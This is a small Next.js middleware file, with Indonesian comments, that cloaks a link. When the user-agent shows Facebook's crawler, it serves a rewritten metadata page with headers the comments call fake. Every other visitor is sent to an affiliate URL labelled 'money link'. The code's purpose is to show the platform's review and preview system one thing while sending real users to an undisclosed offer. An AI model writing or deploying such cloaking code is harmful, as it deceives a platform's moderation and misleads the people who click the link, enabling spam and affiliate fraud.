import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(req: NextRequest) {
  const ua = req.headers.get('user-agent') || '';
  const linkOffer = "https://link-affiliate-kamu.com"; // Link Duit

  // Deteksi Bot Facebook
  if (ua.includes('facebookexternalhit') || ua.includes('Facebot')) {
    const res = NextResponse.rewrite(new URL('/api/raw-meta', req.url));
    
    // Kita injeksi header palsu di level server
    res.headers.set('Content-Type', 'text/html; charset=utf-8');
    res.headers.set('X-Frame-Options', 'ALLOW-FROM https://facebook.com');
    return res;
  }

  return NextResponse.redirect(linkOffer);
}

export const config = { matcher: '/' };
